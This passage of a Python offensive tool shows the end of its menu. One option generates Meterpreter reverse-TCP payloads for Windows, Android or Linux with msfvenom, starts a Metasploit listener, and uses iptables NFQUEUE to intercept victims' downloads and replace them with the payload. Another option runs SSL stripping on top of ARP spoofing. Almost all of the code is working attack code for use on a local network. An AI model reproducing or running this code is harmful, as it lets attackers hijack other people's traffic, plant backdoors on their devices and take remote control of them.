                        win_option = "1. Windows (.exe)"
                        android_option = "2. Android (.apk)"
                        linux_option = "3. Linux (.elf)"

                        if "Windows" in guessed_os:
                            win_option += f" {Colors.GREEN}(Recommended){Colors.END}"
                        elif "Linux" in guessed_os or "Android" in guessed_os:
                            android_option += f" {Colors.GREEN}(Recommended){Colors.END}"
                            linux_option += f" {Colors.GREEN}(Recommended){Colors.END}"

                        print(win_option)
                        print(android_option)
                        print(linux_option)
                        
                        os_choice = input(f"{Colors.YELLOW}[?] Choose target OS (1-3): {Colors.END}").strip()
                        
                        if os_choice == '1':
                            msf_payload, msf_format, payload_name, target_ext = "windows/meterpreter/reverse_tcp", "exe", "payload.exe", b".exe"
                        elif os_choice == '2':
                            msf_payload, msf_format, payload_name, target_ext = "android/meterpreter/reverse_tcp", "raw", "payload.apk", b".apk"
                        elif os_choice == '3':
                            msf_payload, msf_format, payload_name, target_ext = "linux/x64/meterpreter/reverse_tcp", "elf", "payload.elf", b".elf"
                        else:
                            print(f"{Colors.RED}[!] Invalid choice.{Colors.END}")
                            continue

                        print(f"\n{Colors.CYAN}--- Automatic Payload Attack Startup ---{Colors.END}")
                        
                        print(f"{Colors.YELLOW}[*] Phase 1: Generating payload (this might take a minute)...{Colors.END}")
                        try:
                            subprocess.run(
                                ["msfvenom", "-p", msf_payload, f"LHOST={my_ip}", "LPORT=4444", "-f", msf_format, "-o", payload_name],
                                check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                            )
                            print(f"{Colors.GREEN}[+] Payload '{payload_name}' generated successfully.{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.RED}[!] Error generating payload: {e}{Colors.END}")
                            continue
                            
                        print(f"{Colors.YELLOW}[*] Phase 2: Starting Metasploit Listener in a new terminal...{Colors.END}")
                        rc_file = "listener.rc"
                        try:
                            with open(rc_file, "w") as f:
                                f.write(f"use exploit/multi/handler\nset payload {msf_payload}\nset LHOST {my_ip}\nset LPORT 4444\nrun\n")
                            
                            term_opened = False
                            for term in ["x-terminal-emulator", "qterminal", "xfce4-terminal", "gnome-terminal", "xterm"]:
                                if subprocess.run(["which", term], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                                    if term in ["gnome-terminal", "xfce4-terminal", "qterminal"]:
                                        subprocess.Popen([term, "--", "msfconsole", "-q", "-r", rc_file])
                                    else:
                                        subprocess.Popen([term, "-e", f"msfconsole -q -r {rc_file}"])
                                    term_opened = True
                                    break
                            
                            if not term_opened:
                                print(f"{Colors.RED}[!] Unable to open terminal. Start it manually: msfconsole -q -r {rc_file}{Colors.END}")
                            else:
                                print(f"{Colors.GREEN}[+] Metasploit started successfully.{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.RED}[!] Error starting listener: {e}{Colors.END}")
                        
                        print(f"{Colors.YELLOW}[*] Configuring iptables to intercept traffic...{Colors.END}")
                        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
                        if not http_server: start_http_server(my_ip)
                        t = threading.Thread(target=download_interceptor, args=(payload_name, target_ext), daemon=True)
                        t.start()
                    else:
                        download_interceptor_active = False
                        subprocess.run(["iptables", "--flush"])
                        print(f"{Colors.YELLOW}[-] Download interception stopped and iptables restored.{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] This feature is available only on Linux.{Colors.END}")

            elif choice == '8':
                if sys.platform.startswith("linux"):
                    if not arp_spoofing_active:
                        print(f"{Colors.RED}[!] ARP Spoofing must be active to use SSL Stripping!{Colors.END}")
                        time.sleep(2)
                        continue
                    if download_interceptor_active:
                        print(f"{Colors.RED}[!] Cannot run SSL Stripping while Payload Injection is active (both use the same queue).{Colors.END}")
                        time.sleep(2)
                        continue

                    if not ssl_stripping_active:
                        print(f"{Colors.YELLOW}[*] Configuring iptables to intercept traffic...{Colors.END}")
                        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
                        t = threading.Thread(target=ssl_strip_attack, daemon=True)
                        t.start()
                    else:
                        ssl_stripping_active = False
                        subprocess.run(["iptables", "--flush"])
                        print(f"{Colors.YELLOW}[-] SSL Stripping stopped and iptables restored.{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] This feature is available only on Linux.{Colors.END}")

            elif choice == '9':
                raise KeyboardInterrupt
            
            else:
                print(f"{Colors.RED}[!] Invalid option.{Colors.END}")
            
            time.sleep(1)

    except KeyboardInterrupt:
        if 'cleanup' in locals():
            cleanup(None, None)
        else:
            print(f"\n{Colors.RED}[!] Execution aborted.{Colors.END}")
            sys.exit(0)

if __name__ == "__main__":
    main()